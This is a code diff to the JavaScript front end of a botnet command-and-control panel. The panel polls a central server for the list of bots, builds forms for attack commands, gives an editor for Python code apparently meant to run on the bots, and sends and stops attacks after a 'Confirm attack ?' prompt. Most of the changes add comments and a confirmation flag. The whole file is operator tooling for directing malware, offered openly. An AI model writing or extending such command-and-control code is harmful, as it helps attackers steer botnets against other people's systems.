@@ -1,5 +1,10 @@
 let serverURL = null;
+let confirmLeaveCommand = false;
 
+/**
+ * Save the server URL in the local storage
+ * @param {HTMLButtonElement} button Triggered button
+ */
 function saveServerUrl(button) {
     serverURL = document.getElementById('serverUrl').value;
     button.disabled = true;
@@ -11,6 +16,11 @@ function saveServerUrl(button) {
     window.localStorage.setItem('serverURL', serverURL);
 }
 
+/**
+ * Parse the botnets results from central server
+ * @param {Array} botnets Array of botnets
+ * @returns Array of parsed botnets
+ */
 function parseBotnets(botnets) {
     for (let i = 0; i < botnets.length; i++) {
         botnets[i] = JSON.parse(botnets[i]);
@@ -18,6 +28,9 @@ function parseBotnets(botnets) {
     return botnets
 }
 
+/**
+ * Retrieve botnet list from the central server
+ */
 function getBotnets() {
     if (!serverURL || serverURL === '')
         return;
@@ -31,6 +44,10 @@ function getBotnets() {
     xhr.send();
 }
 
+/**
+ * Render botnet list
+ * @param {Array} botnets Array of botnets 
+ */
 function renderBotnets(botnets) {
     const botnetContainer = document.getElementsByClassName('botnet-activity')[0];
     // Delete children
@@ -47,7 +64,17 @@ function renderBotnets(botnets) {
     }
 }
 
+/**
+ * Render a form for a given command
+ * @param {string} command Command name 
+ */
 function generateCommandConfigurationForm(command) {
+    if (confirmLeaveCommand) {
+        if (!confirm("A command is already setup, do you really want to erase it ?")) {
+            return;
+        }
+        confirmLeaveCommand = false;
+    }
     const configContainer = document.getElementById('command-configuration');
     const commandDef = getCommandConfig(command)
     configContainer.innerHTML = '';
@@ -64,6 +91,13 @@ function generateCommandConfigurationForm(command) {
     }
 }
 
+/**
+ * Generates an HTML Element depending on the required input type
+ * @param {string} type Type of the HTML element
+ * @param {string} key Command attribute key
+ * @param {string} value Command attribute value
+ * @returns HTML Element as string
+ */
 function getInput(type, key, value) {
     switch (type) {
         case 'text':
@@ -77,12 +111,25 @@ function getInput(type, key, value) {
     }
 }
 
+/**
+ * Setup the code editor 
+ */
 function setCodeEditorEvents() {
     const editor = ace.edit("editor");
     editor.setTheme("ace/theme/monokai");
     editor.session.setMode("ace/mode/python");
+    editor.setValue("# Your python code here");
+    editor.on('change', function(e) {
+        // If a code is in the editor, require a confirmation before changing command
+        confirmLeaveCommand = editor.getValue().length > 0;
+    });
 }
 
+/**
+ * Return a command definition
+ * @param {string} name Command name
+ * @returns Command definition
+ */
 function getCommandConfig(name) {
     const command = { type: { type: 'text', value: name, label: "Type" } };
     switch (name) {
@@ -104,6 +151,9 @@ function getCommandConfig(name) {
     return command;
 }
 
+/**
+ * Send the command to the central server
+ */
 function sendCommand() {
     if (confirm('Confirm attack ?')) {
         const form = document.getElementById('command-configuration');
@@ -127,6 +177,9 @@ function sendCommand() {
     }
 }
 
+/**
+ * Send the stop command to the central server
+ */
 function stopCommand() {
     if (confirm('Stop attack ?')) {
         const xhr = new XMLHttpRequest();
@@ -137,6 +190,9 @@ function stopCommand() {
     }
 }
 
+/**
+ * Start the bot refreshed list after window loaded
+ */
 window.addEventListener('load', function () {
     serverURL = this.window.localStorage.getItem('serverURL');
     this.setInterval(getBotnets, 1000);
